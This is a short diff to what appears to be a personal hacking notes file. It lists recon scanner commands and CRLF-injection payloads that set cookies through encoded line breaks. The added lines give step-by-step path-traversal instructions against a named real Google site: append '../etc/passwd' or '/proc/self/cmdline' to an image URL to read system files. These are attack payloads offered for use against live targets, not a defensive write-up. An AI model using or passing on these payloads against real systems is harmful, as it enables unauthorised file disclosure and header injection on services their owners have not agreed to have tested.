@@ -4,6 +4,12 @@ crlfi -i /home/lipon/Hacking/recon/urls.txt -o crlf.txt
 ssti -l /home/lipon/Hacking/recon/urls.txt -o ssti.txt
 RedirectHunter -l /home/lipon/Hacking/recon/urls.txt -o redirect.txt
 
+Go to "https://peering.google.com/".
+Open any picture in another window for example: "https://peering.google.com/static/images/couch-ipad.png".
+Add one of this value at the end of the link: ("../../../../../../../etc/passwd") OR ("../../../../../../../proc/self/cmdline") OR ("../../../../../../../proc/self/stat") OR ("../../../../../../../proc/self/status").
+In this way: "https://peering.google.com/static/images/couch-ipad.png../../../../../../../proc/self/cmdline".
+
+
 %0D%0ASet-Cookie:crlfinjection=crlfinjection
 %0d%0a%09headername:%20headervalue
 %E5%98%8A%E5%98%8DSet-Cookie:%20test
